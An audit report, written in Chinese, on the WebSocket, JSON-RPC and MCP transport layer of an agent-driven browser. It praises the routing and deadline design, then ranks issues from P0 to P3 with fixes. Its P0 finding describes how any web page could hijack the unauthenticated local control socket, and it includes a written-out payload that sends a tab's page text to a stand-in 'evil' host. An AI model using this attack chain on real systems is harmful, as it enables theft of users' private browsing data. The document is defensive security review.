# M2 · 传输与协议（WS / JSON-RPC / MCP / CLI）

> 范围：`src/main/ws_server.js`（985 行）、`src/main/mcp_server.js`（410）、
> `src/main/mcp_tools.js`（386）、`src/main/mcp_ws.js`（194）、`src/main/mcp_args.js`、
> `src/shared/{protocol,tab_route,act_params,deadline,guards}.js`、`bin/ai-browser.cjs`、`scripts/cli_call.cjs`。

## 1. 职责与链路

```
agent ──stdio(MCP)──► mcp_server.js ──映射──► mcp_ws.js ──JSON-RPC──┐
                                                                    ├─► ws_server.js ──► PageManager
agent/脚本 ────────── WebSocket ──────────────────────────────────┘        (40 个 ui.* case)
```

- WS：`ws://127.0.0.1:9223`，JSON-RPC 2.0 子集；每个连接一个 `sessionId`，
  可选 `ui.hello` 声明自己是 agent（获得自动工作区 + 标签组限额）。
- MCP：17 个精选工具（`mcp_tools.js`），参数在 `mcp_args.js` 收敛后转发。
- 路由：`explicit tab > session tab > active tab > 第一个 tab`（`shared/tab_route.cjs`），
  这个判据是**多 agent 并用的关键设计**，值得保留。

## 2. 做对了什么

| 机制 | 证据 | 价值 |
|---|---|---|
| 每个 server 实例私有（测试可并行） | `ws_server.js:19-22, 67-82` | 不靠模块全局，e2e 可用随机端口 |
| 路由判据单点化 + 显式 `source` | `shared/tab_route.cjs`、`ws_server.js:176-205` | agent 之间不会「默认打到别人页面」 |
| 双层 deadline（RPC 边界 + PageManager 内部） | `ws_server.js:280-337`、`shared/deadline.js` | 新路径忘套超时也还有一层 |
| 错误落盘 + 调用摘要环形缓冲 | `ws_server.js:13`、`main/error_log.js` | 现场不会只剩一句 JSON-RPC error |
| 状态码/错误码有稳定契约 | `network_monitor.js:20-25` 等 | 调用方可区分「不存在/被淘汰/不可用」 |
| MCP 工具少而精选 + annotations | `mcp_tools.js:6-15` | 控制每轮注入的 token |

## 3. 问题清单

### P0-1 WS 无认证、不校验 `Origin`，且允许 `tab` 显式跨标签 —— 浏览器内的任意网页可完全接管浏览器

**证据**：

- 监听在 loopback：`config.js:19` `wsBindHost = '127.0.0.1'`、`ws_server.js:72`。
- 连接处理完全忽略请求：`ws_server.js:110` `wss.on('connection', (ws, _req) => { ... })`，
  没有 token、没有 `Origin` 校验。
- 裸连接默认打「当前激活标签」：`ws_server.js:176-205`；传 `tab` 则直接使用
  `resolveTargetTab({explicit})`（`page_manager.js:693-701`），**没有任何归属校验**。
- `ui.evaluate` 是任意 JS（`ws_server.js:426-457`）；`ui.screenshot` 可读任意标签视口
  （`ws_server.js:705-714`），还可写任意路径（`page_manager.js:1462-1472`）。

**影响**：任何在本浏览器里打开的页面（尤其是 `http://` 页面；`https` 页面连
`ws://127.0.0.1` 是否被混合内容拦截需实测，但 loopback 通常被视为 potentially trustworthy）
都可以：

1. `ui.list_tabs` 找到用户的网银/邮箱/后台标签；
2. `ui.get_tree {tab: N}` 读取其 DOM 文本（含 CSRF token、订单、邮件）；
3. `ui.evaluate {tab: N, js: "fetch('https://evil/?x='+document.body.innerText)"}` 外传；
4. `ui.screenshot {tab: N, path: '/Users/.../x.png'}` 落盘；
5. `ui.act` 以用户身份提交操作。

这不是「本地进程可信」的问题，而是**页面与浏览器控制面之间没有边界**。README 的安全
声明（「仅监听 localhost，不要暴露到非 loopback」）没有覆盖这一层。

**最小修复**（1 行级）：在 `connection` 里检查 `req.headers.origin` —— 浏览器发起 WS 一定带
`Origin`，Node/MCP 客户端不带；**有 Origin 就 403**。这能立刻堵住页面侧。
**结构性修复**：

1. 启动时生成随机 token（`crypto.randomBytes(32)`），写入 `userData/ws-token`（0600），
   MCP/CLI 读取后放在 URL `?token=` 或首帧 `ui.auth` 里；无 token 拒绝。
2. 或者干脆改用 **Unix domain socket**（macOS/Linux），页面无法连接，只有本机进程能连。
3. 对 `explicit tab` 加归属校验：非本 session 所属 group 的 tab 需要显式
   `allow_cross_tab:true`（默认拒绝），把「一个被攻破的 agent」也限制在它自己的工作区。
4. 给 `ui.screenshot.path` 加白名单目录（`userData/screenshots`），禁止任意写。

**验收**：新增 e2e：在页面里 `new WebSocket('ws://127.0.0.1:9223')` 必须被拒；
无 token 的 Node 客户端也被拒；带 token 的 MCP 全绿。

> 这是本轮审计唯一的 P0。它不影响「agent 能不能用」，但决定「用户敢不敢用它登录」。

---

### P1-1 MCP 传输层固定 15s 超时，静默腰斩 `browse_wait` / 长动作的 120s–300s 预算

**证据**：`mcp_ws.js:26` `timeout = 15000`；`mcp_ws.js:154-161` 每个 RPC 到点 `reject('WS timeout')`；
工具却声明了更长预算：`mcp_tools.js:56`（act「1s..300s」）、`mcp_tools.js:166`（wait 默认 10s，
服务端上限 120s：`ws_server.js:729`）。

**影响**：通过 MCP 调用 `browse_wait {timeout_ms: 60000}`，第 15 秒必然收到
`WS timeout`，而服务端仍在每 500ms 抽一次树，直到 60s 才结束 —— 调用方重试会叠加负载。
`browse_act` 的 300s 逃生门同样不可达。错误信息也不含方法名/耗时，排查只能靠猜。

**修复**：`call(method, params, { timeoutMs })`；MCP 层按 `params.timeout_ms` + 5s 余量计算，
wait 至少 `timeout_ms + 2000`；错误里带 `method` 与 `elapsed`。

**验收**：新增单测：`browse_wait {timeout_ms:20000}` 的传输 deadline ≥ 22s；超时报错含方法名。

---

### P1-2 `browse_get_tree` 的 `subset` / `mode` 在默认读法下被静默忽略

**证据**：`ws_server.js:270-276` 只有 `params.ax` 为真才把 `subset`/`mode` 传给
`getTreeViaAx`；默认分支 `pageManager.getTree(focusedOnly, tabId)` 根本不接这两个参数。
实现只在 AX 路径：`page_manager.js:1583`（diff）、`page_manager.js:1593`（interactive）。
MCP schema 无条件声明二者（`mcp_tools.js:36-37`、`mcp_server.js:112-117`）。

**影响**：agent 读到一个 3000 节点的大页面，按文档传 `subset:'interactive'` 想省 token，
实际拿到的仍是全量树；传 `mode:'diff'` 期待增量，实际拿到 `{tree: ...}` 而没有 `diff` 字段。
**能力静默失效**是比报错更难查的一类 bug（本项目自己的 AUDIT 已记录过 5 次同类事故）。

**修复（二选一）**：
- 让默认路径也实现 `subset`（复用 `axExtractor.filterInteractive`，它对普通树同样适用）；
- 或在 WS/MCP 层显式拒绝：`subset/mode requires ax:true`，并同步文档。

**验收**：`browse_get_tree {subset:'interactive', ax:false}` 返回的节点数显著小于 full；
`{mode:'diff', ax:false}` 要么给 diff，要么明确报错。

---

### P1-3 双接口「手写转发」仍在，参数漏抄不会报错

**证据**：WS 是 40 个 `case` 的巨型 switch（`ws_server.js:267-930`）；MCP 是 17 个 `case`
（`mcp_server.js:99-380`）；参数名在 `mcp_tools.js`（对外）→ `mcp_args.js`（act）→
`ws_server.js`（对内）→ `page_manager` 四层之间手工搬运。
历史事故：`frame_ref` 在 MCP 层被丢弃（`docs/AUDIT-2026-10-30.md` P1-1）、
`dx/dy` 被 `delta_x/delta_y` 覆盖（`mcp_args.js:1-15` 注释）。

**影响**：新增一个参数要改 4 处，漏一处 = 能力静默失效；且没有编译期/测试期强制。
`tests/test_mcp_forwarding.js` 是「逐个断言」而非「由 schema 生成」，新增字段不会自动被覆盖。

**结构性修复**：建立**唯一方法表** `methods.js`：

```js
{ 'ui.get_tree': { params: {...}, handler: (pm, p) => ... , mcp: { name:'browse_get_tree', map } } }
```

WS 分发、MCP 工具声明、参数校验、契约测试全部从这张表生成。至少先做
「schema 声明字段 ⊆ 实际消费字段」的自动比对测试，防止下一次漏抄。

**验收**：新增一个工具只改一个文件；`test_api_budget` 自动覆盖。

---

### P1-4 `ui.wait` 在 `text_contains` / `url_contains` 时每轮都抽整棵树（且树根本不用）

**证据**：`ws_server.js:747-748` 每轮无条件 `await pageManager.getTree(false, tabId)`；
`text_contains`（`ws_server.js:770-779`）与 `url_contains`（`ws_server.js:780-790`）只用
`evaluate`。而 `getTree` 会：preload 同步抽取 + 自动合并 OOPIF（`page_manager.js:1166-1180`）
+ editors 索引（`page_manager.js:1184-1190`）+ 覆盖率标注。

**影响**：一次 `wait` 轮询可能耗时数百 ms 到数秒（跨进程帧多时更久），
500ms 的轮询间隔名存实亡；`url_contains` 只需要一次 `location.href` 却付出了整棵树。
叠加 P1-1 的 15s MCP 上限，长等待几乎必失败。

**修复**：按 condition 选探针 —— `text_contains`/`url_contains` 只 `evaluate`，
`button_enabled`/`modal_appeared` 才读树；轮询间隔自适应（连续失败指数退避）。

**验收**：`e2e` 记录每轮耗时；`url_contains` 单轮 < 50ms。

---

### P2-1 未知 `condition` 会静默空转满 120s

**证据**：`ws_server.js:754-790` 只有四个 `if`，没有 `else`；非法值不报错，
循环到超时后返回 `satisfied:false`（无 `last_error`）。
MCP schema 的 enum 能挡一部分，但裸 WS 客户端（脚本/e2e）挡不住。

**修复**：入口校验 enum，非法值返回 `-32602 Invalid params`。

---

### P2-2 错误通道不统一

- 解析错误响应缺 `id: null`（`ws_server.js:143-146`，JSON-RPC 2.0 要求）。
- 同一类「操作没成功」有时是 `{ok:false, success:false}`（如 `ui.tabs close`、`ui.act`），
  有时抛成 `-32603`（`browse_diff` 未知 op、`browse_canvas` 未知 op）。
- `ui.wait` 的 `satisfied:false` 不带原因。

**影响**：agent 需要为每个工具记一套错误语义；「重试 / 换策略 / 停下问人」的判断容易做错。

**修复**：定义 `ToolError { code, retryable, hint }`，RPC 层映射 `-32602/-32603`；
所有工具统一返回 `{ok, error:{code,message,hint}}`。

---

### P2-3 同一 socket 上的并发请求无串行化，动作可能交错

**证据**：`ws_server.js:142` `ws.on('message', async (raw) => {...})` 对每条消息独立 `await`。
两个 `ui.act` 同时打到同一 tab 会并发进入 `PageManager.executeAction`（各自 probe → act → probe）。

**影响**：多 agent / 一个 agent 并行调用时，`page_changed` 指纹会互相污染；
重复点击/重复提交的风险升高。当前靠调用方自律（agent 通常串行），不是机制保证。

**修复**：按 tab 维护一个动作队列（`Map<tabId, Promise>`），或在 WS 层对同一 session 串行。
读操作可并行，写操作（act/navigate/scroll）必须排队。

---

### P3-1 `ui.paint_check` 绕过 session 路由

**证据**：`ws_server.js:369` 直接 `params.tab ?? pageManager.activeTab`，不使用已解析的 `tabId`。
`heal:true` 时会对「人正在看的页面」执行重载/自救（`page_manager.js:4556-4570`）。

**影响**：多 agent 场景下，一个 agent 的 paint_check 可能重载另一个 agent/人的页面。

**修复**：与其它 case 一样使用 `tabId`。

---

### P3-2 `ui.screenshot` 回执把 `tab` 误报为「未使用参数」

**证据**：`ws_server.js:711` 把整个 `params`（含 `tab`）传给 `pageManager.screenshot`；
`page_manager.js:1482` 的 `known` 白名单不含 `tab` → `ignored_params: ['tab']`。

**影响**：每次截图都多一条假警告，削弱「ignored_params 值得看」的信任。

**修复**：`known` 加入 `tab`，或只传截图相关字段。

---

## 4. 效率 / 简洁性

- 40 个 case 的 switch 本身不是性能问题，是**可维护性**问题：新方法只能插在中间，
  路由、参数归一、错误映射、deadline 各写一遍。建议至少把每个 case 抽成
  `handlers/ui_*.js`，switch 变成 `handlers[method](pm, params, ctx)`。
- `ui.wait` 的实际轮询成本远高于文档给人的印象（见 P1-4）。
- `mcp_server` 17 个 case 里大量重复的 `return { content: [{ type:'text', text: JSON.stringify(result) }] }`，
  可收敛为 `asText(result)`，减少噪声。

## 5. 评分

| 维度 | 分 | 说明 |
|---|---|---|
| 架构 | 3.0 | 分层清楚，但双接口手写转发是结构性债 |
| 逻辑 | 3.0 | 路由与 deadline 设计好；超时/错误语义有硬伤 |
| 质量 | 3.0 | 注释极好，switch 过长，错误通道不统一 |
| 效率 | 2.5 | wait 轮询代价高；MCP 超时腰斩 |
| 可测 | 4.0 | WS 层可用 mock PageManager 单测，已有 10+ 文件覆盖 |
| 风险 | 1.5 | P0：无认证/Origin 校验，页面可接管浏览器 |

## 6. 结论

协议层的**设计**（路由判据、双层 deadline、错误落盘、状态码契约）是项目里最成熟的部分；
**实现**（手写 switch + 手写 MCP 转发）是最容易继续出事故的部分；**边界**（无认证）
是当前唯一必须先修的部分。顺序建议：P0 认证 → P1-1 超时 → P1-2 参数 → 方法表重构。
